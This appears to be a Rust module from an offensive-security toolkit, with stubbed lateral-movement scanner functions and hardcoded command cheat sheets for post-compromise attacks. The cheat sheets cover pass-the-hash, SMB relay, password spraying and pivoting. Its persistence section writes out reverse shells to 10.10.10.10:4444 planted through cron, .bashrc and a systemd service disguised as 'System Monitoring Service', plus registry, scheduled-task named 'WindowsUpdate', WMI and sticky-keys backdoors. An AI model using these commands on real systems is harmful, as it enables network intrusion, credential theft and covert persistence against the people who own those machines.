/// Lateral Movement Techniques
///
/// ✅ ZERO DEPENDENCIES - Pure Rust lateral movement enumeration
///
/// **What Does This Do?**
/// After compromising one system, enumerate opportunities to move laterally
/// to other systems in the network:
/// - Network discovery (live hosts, open ports)
/// - Credential reuse (password spraying)
/// - Pass-the-Hash (Windows)
/// - SSH key reuse
/// - Shared folders/NFS
/// - Trust relationships
///
/// **Lateral Movement Workflow**:
/// 1. Enumerate network (ARP, ping sweep, port scan)
/// 2. Identify credential reuse opportunities
/// 3. Test credentials across multiple hosts
/// 4. Exploit trust relationships
/// 5. Pivot through compromised hosts
///
/// **⚠️ AUTHORIZED USE ONLY**
///
/// **Works alongside**:
/// - CrackMapExec (credential spraying)
/// - BloodHound (AD enumeration)
/// - Responder (LLMNR/NBT-NS poisoning)
/// - Impacket (SMB/WMI exploitation)
/// - Metasploit (pivoting)
use std::collections::HashMap;
use std::net::IpAddr;

/// Network host information
#[derive(Debug, Clone)]
pub struct NetworkHost {
    pub ip: IpAddr,
    pub hostname: Option<String>,
    pub os: Option<String>,
    pub open_ports: Vec<u16>,
    pub services: HashMap<u16, String>,
    pub credentials_tested: Vec<CredentialTest>,
}

/// Credential test result
#[derive(Debug, Clone)]
pub struct CredentialTest {
    pub username: String,
    pub password: String,
    pub service: String,
    pub port: u16,
    pub success: bool,
    pub error: Option<String>,
}

/// Lateral movement opportunity
#[derive(Debug, Clone)]
pub struct LateralMovementVector {
    pub target_host: IpAddr,
    pub technique: MovementTechnique,
    pub description: String,
    pub command: String,
    pub risk_level: RiskLevel,
}

/// Movement technique
#[derive(Debug, Clone, PartialEq)]
pub enum MovementTechnique {
    SshKeyReuse,
    PasswordReuse,
    PassTheHash,
    WmiExec,
    PsExec,
    SmbRelay,
    TrustedRelationship,
    SharedFolder,
}

/// Risk level for detection
#[derive(Debug, Clone, PartialEq)]
pub enum RiskLevel {
    Low,      // Unlikely to be detected
    Medium,   // May trigger alerts
    High,     // Likely to be detected
    Critical, // Will definitely be logged/alerted
}

impl RiskLevel {
    pub fn as_str(&self) -> &str {
        match self {
            RiskLevel::Low => "LOW",
            RiskLevel::Medium => "MEDIUM",
            RiskLevel::High => "HIGH",
            RiskLevel::Critical => "CRITICAL",
        }
    }
}

/// Lateral movement scanner
pub struct LateralMovementScanner;

impl LateralMovementScanner {
    pub fn new() -> Self {
        Self
    }

    /// Discover live hosts in network
    pub fn discover_hosts(&self) -> Result<Vec<NetworkHost>, String> {
        // TODO: Implement ping sweep, ARP scan
        Ok(Vec::new())
    }

    /// Test credential reuse across hosts
    pub fn test_credential_reuse(
        &self,
        _hosts: &[NetworkHost],
        _username: &str,
        _password: &str,
    ) -> Result<Vec<CredentialTest>, String> {
        // TODO: Test SSH, SMB, WinRM, RDP
        Ok(Vec::new())
    }

    /// Enumerate lateral movement opportunities
    pub fn enumerate_vectors(&self) -> Result<Vec<LateralMovementVector>, String> {
        let mut vectors = Vec::new();

        // SSH key reuse
        vectors.extend(self.enumerate_ssh_keys()?);

        // SMB/Windows techniques
        vectors.extend(self.enumerate_smb_vectors()?);

        // Trust relationships
        vectors.extend(self.enumerate_trust_relationships()?);

        Ok(vectors)
    }

    /// Find SSH keys that can be reused
    fn enumerate_ssh_keys(&self) -> Result<Vec<LateralMovementVector>, String> {
        // TODO: Find id_rsa, authorized_keys
        Ok(Vec::new())
    }

    /// Find SMB-based lateral movement opportunities
    fn enumerate_smb_vectors(&self) -> Result<Vec<LateralMovementVector>, String> {
        // TODO: Enumerate SMB shares, test null sessions
        Ok(Vec::new())
    }

    /// Find trust relationships
    fn enumerate_trust_relationships(&self) -> Result<Vec<LateralMovementVector>, String> {
        // TODO: Check .rhosts, .ssh/config, known_hosts
        Ok(Vec::new())
    }

    /// Generate lateral movement commands
    pub fn generate_movement_commands() -> HashMap<&'static str, &'static str> {
        let mut commands = HashMap::new();

        // SSH techniques
        commands.insert(
            "ssh_key_reuse",
            r#"# SSH with stolen key
ssh -i /path/to/stolen/id_rsa user@target
ssh -i id_rsa -o "StrictHostKeyChecking=no" user@target

# SSH agent forwarding (be careful!)
ssh -A user@jumphost
# Then from jumphost:
ssh user@target  # Uses your local SSH keys!"#,
        );

        commands.insert(
            "ssh_tunneling",
            r#"# Local port forwarding (access internal service)
ssh -L 8080:internal-server:80 user@jumphost
# Access: http://localhost:8080

# Dynamic SOCKS proxy
ssh -D 9050 user@jumphost
# Configure proxychains: socks5 127.0.0.1 9050
proxychains nmap internal-network

# Remote port forwarding (expose local service to remote network)
ssh -R 4444:localhost:4444 user@jumphost
# Your local listener on 4444 is now accessible on jumphost:4444"#,
        );

        // Windows techniques
        commands.insert(
            "psexec",
            r#"# PsExec (requires admin on target)
# Using Impacket
impacket-psexec domain/user:password@target

# Using Metasploit
use exploit/windows/smb/psexec
set RHOST target
set SMBUser user
set SMBPass password
exploit"#,
        );

        commands.insert(
            "wmiexec",
            r#"# WMI Execution (stealthier than PsExec)
impacket-wmiexec domain/user:password@target

# With hash (Pass-the-Hash)
impacket-wmiexec -hashes :NTLM_HASH domain/user@target"#,
        );

        commands.insert(
            "pass_the_hash",
            r#"# Pass-the-Hash with Impacket
# Extract NTLM hash with mimikatz or secretsdump
impacket-secretsdump domain/user:password@target

# Use hash to authenticate
impacket-psexec -hashes LM:NTLM domain/user@target
impacket-wmiexec -hashes :NTLM domain/user@target

# CrackMapExec (mass exploitation)
crackmapexec smb 192.168.1.0/24 -u user -H NTLM_HASH --exec-method wmiexec -x "whoami""#,
        );

        commands.insert(
            "smb_relay",
            r#"# SMB Relay attack
# 1. Start Responder to capture hashes
responder -I eth0

# 2. Relay to target (using ntlmrelayx)
impacket-ntlmrelayx -t smb://target -c "whoami"

# 3. Trigger authentication (from victim)
# User connects to \\attacker-ip\share"#,
        );

        // Linux techniques
        commands.insert(
            "nfs_mount",
            r#"# Mount NFS shares
showmount -e target
mkdir /tmp/nfs
mount -t nfs target:/shared /tmp/nfs

# If no_root_squash, create SUID binary
# See privilege escalation guide"#,
        );

        commands.insert(
            "rsync_abuse",
            r#"# rsync without authentication
rsync -av target::share /tmp/backup

# Upload reverse shell
rsync -av shell.sh target::share/"#,
        );

        // Credential spraying
        commands.insert(
            "password_spraying",
            r#"# Password spraying (avoid lockouts!)
# Rule: Max 1 attempt per user per hour

# SSH spraying
crackmapexec ssh 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success

# SMB spraying
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success

# WinRM spraying
crackmapexec winrm 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success

# Custom script (safer - add delays)
for user in $(cat users.txt); do
  ssh $user@target "echo test" 2>/dev/null && echo "$user works!"
  sleep 3600  # 1 hour delay between attempts
done"#,
        );

        // Pivoting
        commands.insert(
            "metasploit_pivot",
            r#"# Metasploit pivoting
# 1. Get meterpreter session on jumphost
meterpreter> run autoroute -s 10.10.10.0/24

# 2. Set up SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
run

# 3. Configure proxychains
# Edit /etc/proxychains.conf:
# socks5 127.0.0.1 9050

# 4. Scan internal network
proxychains nmap -sT -Pn 10.10.10.0/24"#,
        );

        commands.insert(
            "chisel_tunnel",
            r#"# Chisel (modern alternative to SSH tunneling)
# On attacker:
./chisel server -p 8080 --reverse

# On compromised host:
./chisel client attacker-ip:8080 R:1080:socks

# Now use SOCKS5 proxy on localhost:1080"#,
        );

        commands
    }
}

impl Default for LateralMovementScanner {
    fn default() -> Self {
        Self::new()
    }
}

/// Persistence techniques
pub struct PersistenceMechanism;

impl PersistenceMechanism {
    /// Generate persistence commands
    pub fn generate_persistence_commands() -> HashMap<&'static str, &'static str> {
        let mut commands = HashMap::new();

        // Linux persistence
        commands.insert(
            "cron_persistence",
            r#"# Add cron job
(crontab -l 2>/dev/null; echo "* * * * * /tmp/backdoor.sh") | crontab -

# Cron job with reverse shell
(crontab -l 2>/dev/null; echo "@reboot bash -i >& /dev/tcp/10.10.10.10/4444 0>&1") | crontab -"#,
        );

        commands.insert(
            "ssh_key_persistence",
            r#"# Add SSH public key to authorized_keys
echo "ssh-rsa AAAA...your-public-key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Create new SSH key pair if needed:
ssh-keygen -t rsa -b 4096 -f /tmp/backdoor -N ""
cat /tmp/backdoor.pub >> ~/.ssh/authorized_keys
# Download /tmp/backdoor (private key) to attacker machine"#,
        );

        commands.insert(
            "systemd_service",
            r#"# Create systemd service (requires root)
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service"#,
        );

        commands.insert(
            "bashrc_persistence",
            r#"# Add to .bashrc (executes on user login)
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1 &' >> ~/.bashrc

# Or add to /etc/profile (all users, requires root)
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1 &' >> /etc/profile"#,
        );

        // Windows persistence
        commands.insert(
            "registry_run_key",
            r#"# Add to registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# HKLM (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe""#,
        );

        commands.insert(
            "scheduled_task",
            r#"# Create scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru System

# Trigger on idle
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onidle /i 10"#,
        );

        commands.insert(
            "wmi_persistence",
            r#"# WMI Event Subscription (very stealthy)
# Create on target via PowerShell:
$FilterArgs = @{
    name='WindowsUpdateFilter'
    EventNameSpace='root\CimV2'
    QueryLanguage="WQL"
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{
    name='WindowsUpdateConsumer'
    CommandLineTemplate='C:\Windows\Temp\backdoor.exe'
}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
    Filter = [Ref]$Filter
    Consumer = [Ref]$Consumer
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs"#,
        );

        commands.insert(
            "sticky_keys",
            r#"# Sticky Keys backdoor (before lock screen)
# Backup original
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak

# Replace with cmd.exe
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# Now press Shift 5 times on login screen -> cmd as SYSTEM!

# Restore:
copy /Y C:\Windows\System32\sethc.exe.bak C:\Windows\System32\sethc.exe"#,
        );

        commands
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_movement_commands() {
        let commands = LateralMovementScanner::generate_movement_commands();
        assert!(commands.contains_key("ssh_key_reuse"));
        assert!(commands.contains_key("pass_the_hash"));
    }

    #[test]
    fn test_persistence_commands() {
        let commands = PersistenceMechanism::generate_persistence_commands();
        assert!(commands.contains_key("cron_persistence"));
        assert!(commands.contains_key("registry_run_key"));
    }
}
